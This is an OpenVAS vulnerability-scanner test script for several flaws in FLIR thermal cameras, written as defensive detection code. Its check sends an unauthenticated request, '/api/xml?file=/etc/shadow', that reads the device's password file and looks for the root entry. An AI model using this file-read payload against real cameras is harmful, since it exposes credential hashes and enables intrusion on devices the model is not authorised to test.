###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_flir_systems_camera_mult_vuln.nasl 12038 2018-10-23 12:58:19Z asteins $
#
# FLIR Systems Cameras Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:flir_systems:camera";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140401");
  script_version("$Revision: 12038 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-23 14:58:19 +0200 (Tue, 23 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-09-26 16:38:33 +0700 (Tue, 26 Sep 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("FLIR Systems Cameras Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_flir_systems_detect.nasl");
  script_mandatory_keys("flir_camera/detected");

  script_tag(name:"summary", value:"FLIR Systems FLIR Thermal/Infrared Camera FC-Series S, FC-Series ID,
  PT-Series are prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"FLIR Systems FLIR Thermal/Infrared Camera FC-Series S, FC-Series ID,
  PT-Series are prone to multiple vulnerabilities:

  - Information disclosure

  - Stream disclosure

  - Unauthenticated Remote Code Execution

  - Authenticated Remote Code Execution

  - Hard-coded Credentials");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_xref(name:"URL", value:"https://blogs.securiteam.com/index.php/archives/3411");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

url = '/api/xml?file=/etc/shadow';

if (http_vuln_check(port: port, url: url, pattern: 'root:.*:0:', check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
